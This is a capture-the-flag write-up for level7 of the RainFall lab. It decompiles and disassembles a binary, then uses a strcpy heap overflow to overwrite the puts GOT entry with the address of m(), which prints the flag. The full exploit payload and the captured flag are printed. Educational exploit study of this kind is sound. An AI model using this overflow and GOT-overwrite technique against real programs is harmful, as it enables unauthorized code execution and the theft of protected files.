We retrieve the executable using scp:

```
scp -P 4242 level7@0.0.0.0:/home/user/level7/level7 .
```

I use dogbolt to decompile the code; here's the version with Binary Ninja, with a few tweaks for the sake of clarity:

```c
const c = 0x8049960; // flag is at this address after fgets call

int m() {
    return printf("%s - %d\n", &c, time());
}

int main(int argc, char** argv, char** envp)
{
    int* eax = malloc(8);
    *eax = 1;
    eax[1] = malloc(8);
    int* eax_4 = malloc(8);
    *eax_4 = 2;
    eax_4[1] = malloc(8);
    strcpy(eax[1], argv[1]);
    strcpy(eax_4[1], argv[2]);
    fgets(&c, 68, fopen("/home/user/level8/.pass", "r"));
    puts("~~");
    return 0;
}
```

The program segfaults at the calls to strcpy if the arguments are not added:

```c
level7@RainFall:~$ ./level7
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 a b
~~
```

Here's the objdump of the executable:

```nasm
080484f4 <m>:
 80484f4:	55                   	push   %ebp
 80484f5:	89 e5                	mov    %esp,%ebp
 80484f7:	83 ec 18             	sub    $0x18,%esp
 80484fa:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048501:	e8 ca fe ff ff       	call   80483d0 <time@plt>
 8048506:	ba e0 86 04 08       	mov    $0x80486e0,%edx
 804850b:	89 44 24 08          	mov    %eax,0x8(%esp)
 804850f:	c7 44 24 04 60 99 04 	movl   $0x8049960,0x4(%esp)
 8048516:	08 
 8048517:	89 14 24             	mov    %edx,(%esp)
 804851a:	e8 91 fe ff ff       	call   80483b0 <printf@plt>
 804851f:	c9                   	leave  
 8048520:	c3                   	ret    

08048521 <main>:
 8048521:	55                   	push   %ebp
 8048522:	89 e5                	mov    %esp,%ebp
 8048524:	83 e4 f0             	and    $0xfffffff0,%esp
 8048527:	83 ec 20             	sub    $0x20,%esp
 804852a:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
 8048531:	e8 ba fe ff ff       	call   80483f0 <malloc@plt>
 8048536:	89 44 24 1c          	mov    %eax,0x1c(%esp)
 804853a:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 804853e:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
 8048544:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
 804854b:	e8 a0 fe ff ff       	call   80483f0 <malloc@plt>
 8048550:	89 c2                	mov    %eax,%edx
 8048552:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 8048556:	89 50 04             	mov    %edx,0x4(%eax)
 8048559:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
 8048560:	e8 8b fe ff ff       	call   80483f0 <malloc@plt>
 8048565:	89 44 24 18          	mov    %eax,0x18(%esp)
 8048569:	8b 44 24 18          	mov    0x18(%esp),%eax
 804856d:	c7 00 02 00 00 00    	movl   $0x2,(%eax)
 8048573:	c7 04 24 08 00 00 00 	movl   $0x8,(%esp)
 804857a:	e8 71 fe ff ff       	call   80483f0 <malloc@plt>
 804857f:	89 c2                	mov    %eax,%edx
 8048581:	8b 44 24 18          	mov    0x18(%esp),%eax
 8048585:	89 50 04             	mov    %edx,0x4(%eax)
 8048588:	8b 45 0c             	mov    0xc(%ebp),%eax
 804858b:	83 c0 04             	add    $0x4,%eax
 804858e:	8b 00                	mov    (%eax),%eax
 8048590:	89 c2                	mov    %eax,%edx
 8048592:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 8048596:	8b 40 04             	mov    0x4(%eax),%eax
 8048599:	89 54 24 04          	mov    %edx,0x4(%esp)
 804859d:	89 04 24             	mov    %eax,(%esp)
 80485a0:	e8 3b fe ff ff       	call   80483e0 <strcpy@plt>
 80485a5:	8b 45 0c             	mov    0xc(%ebp),%eax
 80485a8:	83 c0 08             	add    $0x8,%eax
 80485ab:	8b 00                	mov    (%eax),%eax
 80485ad:	89 c2                	mov    %eax,%edx
 80485af:	8b 44 24 18          	mov    0x18(%esp),%eax
 80485b3:	8b 40 04             	mov    0x4(%eax),%eax
 80485b6:	89 54 24 04          	mov    %edx,0x4(%esp)
 80485ba:	89 04 24             	mov    %eax,(%esp)
 80485bd:	e8 1e fe ff ff       	call   80483e0 <strcpy@plt>
 80485c2:	ba e9 86 04 08       	mov    $0x80486e9,%edx
 80485c7:	b8 eb 86 04 08       	mov    $0x80486eb,%eax
 80485cc:	89 54 24 04          	mov    %edx,0x4(%esp)
 80485d0:	89 04 24             	mov    %eax,(%esp)
 80485d3:	e8 58 fe ff ff       	call   8048430 <fopen@plt>
 80485d8:	89 44 24 08          	mov    %eax,0x8(%esp)
 80485dc:	c7 44 24 04 44 00 00 	movl   $0x44,0x4(%esp)
 80485e3:	00 
 80485e4:	c7 04 24 60 99 04 08 	movl   $0x8049960,(%esp)
 80485eb:	e8 d0 fd ff ff       	call   80483c0 <fgets@plt>
 80485f0:	c7 04 24 03 87 04 08 	movl   $0x8048703,(%esp)
 80485f7:	e8 04 fe ff ff       	call   8048400 <puts@plt>
 80485fc:	b8 00 00 00 00       	mov    $0x0,%eax
 8048601:	c9                   	leave  
 8048602:	c3                   	ret    
```

In normal usage with the arguments 'a' and 'b', by setting a breakpoint at the end of the program before fgets:

```nasm
0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:	mov    $0x80486e9,%edx
   0x080485c7 <+166>:	mov    $0x80486eb,%eax
   0x080485cc <+171>:	mov    %edx,0x4(%esp)
   0x080485d0 <+175>:	mov    %eax,(%esp)
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:	mov    %eax,0x8(%esp)
   0x080485dc <+187>:	movl   $0x44,0x4(%esp)
=> 0x080485e4 <+195>:	movl   $0x8049960,(%esp)
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:	movl   $0x8048703,(%esp)
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
   0x080485fc <+219>:	mov    $0x0,%eax
   0x08048601 <+224>:	leave  
   0x08048602 <+225>:	ret
```

edx and eax contain the following values:

```nasm
(gdb) x/s 0x80486e9
0x80486e9:	 "r"
(gdb) x/s 0x80486eb
0x80486eb:	 "/home/user/level8/.pass"
```

At the end of the program, here's what happens:

```nasm
   0x080485c2 <+161>:	mov    $0x80486e9,%edx ; "r"
   0x080485c7 <+166>:	mov    $0x80486eb,%eax ; "/home/user/level8/.pass"
   0x080485cc <+171>:	mov    %edx,0x4(%esp)
   0x080485d0 <+175>:	mov    %eax,(%esp)
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:	mov    %eax,0x8(%esp)
   0x080485dc <+187>:	movl   $0x44,0x4(%esp)
   0x080485e4 <+195>:	movl   $0x8049960,(%esp)
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:	movl   $0x8048703,(%esp) ; "~~"
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
   0x080485fc <+219>:	mov    $0x0,%eax
   0x08048601 <+224>:	leave  
   0x08048602 <+225>:	ret
```

The arguments are sent to the ESP register for use with fopen:

```nasm
(gdb) x/s 0x80486e9
0x80486e9:	 "r"
(gdb) x/s 0x80486eb
0x80486eb:	 "/home/user/level8/.pass"
```

The pointer to the file, contained in EAX which was returned by the call to fopen, along with the integer 68 (0x44), and a memory address (0x8049960) to store the content to be read, are passed as arguments to fgets(). Finally, a call to puts is made with `0x8048703`, containing "~~", as an argument:

```nasm
(gdb) x/s 0x8048703
0x8048703:	 "~~"
```

The memory address where the flag will be found, `0x8049960`, is also the address that printf displays in the m() function:

```nasm
 804850f:	c7 44 24 04 60 99 04 	movl   $0x8049960,0x4(%esp) <---
 8048516:	08 
 8048517:	89 14 24             	mov    %edx,(%esp)
 804851a:	e8 91 fe ff ff       	call   80483b0 <printf@plt>
```

Therefore, a way must be found to call the m() function after the call to fgets().

Here, we can see that a buffer overflow on the first strcpy allows us to rewrite the dest argument of the second one starting from an offset of 20:

```nasm
level7@RainFall:~$ ltrace ./level7 $(python -c 'print "a" * 24') b
__libc_start_main(0x8048521, 3, 0xbffff7d4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                              = 0x0804a008
malloc(8)                              = 0x0804a018
malloc(8)                              = 0x0804a028
malloc(8)                              = 0x0804a038
strcpy(0x0804a018, "aaaaaaaaaaaaaaaaaaaaaaaa") = 0x0804a018
strcpy(0x61616161, "b" <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

It is thus possible to rewrite any content at any address, knowing that the second argument corresponds to the source of the second strcpy.

We therefore have an argument structure that can be made up of:

- argv1 = 20+addr
- argv2 = content

Since the program must go through fgets before displaying the flag, we can use the puts() function, which is unnecessary in the program, by performing a GOT overwrite as in level5:

```nasm
level7@RainFall:~$ objdump -R ./level7

./level7:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049904 R_386_GLOB_DAT    __gmon_start__
08049914 R_386_JUMP_SLOT   printf
08049918 R_386_JUMP_SLOT   fgets
0804991c R_386_JUMP_SLOT   time
08049920 R_386_JUMP_SLOT   strcpy
08049924 R_386_JUMP_SLOT   malloc
08049928 R_386_JUMP_SLOT   puts ; <-----
0804992c R_386_JUMP_SLOT   __gmon_start__
08049930 R_386_JUMP_SLOT   __libc_start_main
08049934 R_386_JUMP_SLOT   fopen
```

By overwriting the address of puts() with the address of the m() function, the program should be able to display the flag. So now we have:

`arg1(offset(20) + puts(08049928)) arg2(m(080484f4))`

Which gives us the following payload:

```nasm
./level7 $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

And here is the flag!

```nasm
level7@RainFall:~$ ./level7 $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1704474940
```